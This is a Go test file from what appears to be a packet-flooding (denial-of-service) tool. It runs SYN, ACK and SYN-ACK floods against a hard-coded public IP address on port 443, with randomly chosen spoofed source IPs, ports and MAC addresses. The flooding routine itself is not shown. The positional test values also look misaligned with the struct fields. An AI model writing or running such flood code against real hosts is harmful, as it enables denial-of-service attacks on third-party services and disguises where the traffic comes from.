package raw

import (
	"context"
	"github.com/stretchr/testify/assert"
	"math/rand"
	"testing"
	"time"
)

func TestStartFlooding(t *testing.T) {
	srcIps := getIps()
	srcPorts := getPorts()
	macAddrs := getMacAddrs()
	cases := []struct {
		name, floodType                 string
		payloadLength, srcPort, dstPort int
		floodMilliSeconds               int64
		srcIp, dstIp                    string
		srcMacAddr, dstMacAddr          []byte
	}{
		{"10byte_syn", "syn", 10, srcPorts[rand.Intn(len(srcPorts))],
			443, 10, srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))]},
		{
			"10byte_ack", "ack", 10, srcPorts[rand.Intn(len(srcPorts))],
			443, 10, srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))],
		},
		{
			"10byte_synack", "synAck", 10, srcPorts[rand.Intn(len(srcPorts))],
			443, 10, srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))],
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(tc.floodMilliSeconds)*time.Millisecond)
			defer cancel()

			go func() {
				t.Logf("starting flood, caseName=%s, floodType=%s, floodMilliSeconds=%d\n", tc.name, tc.floodType, tc.floodMilliSeconds)
				err := StartFlooding(tc.dstIp, tc.dstPort, tc.payloadLength, tc.floodType)
				assert.Nil(t, err)
				t.Logf("ending flood, caseName=%s, floodType=%s, floodMilliSeconds=%d\n", tc.name, tc.floodType, tc.floodMilliSeconds)
				cancel()
			}()

			select {
			case <-ctx.Done():
				t.Logf("context closed, caseName=%s, floodType=%s, floodMilliSeconds=%d\n", tc.name, tc.floodType, tc.floodMilliSeconds)
			case <-time.After(120 * time.Second):
				t.Log("overslept")
			}
		})
	}
}
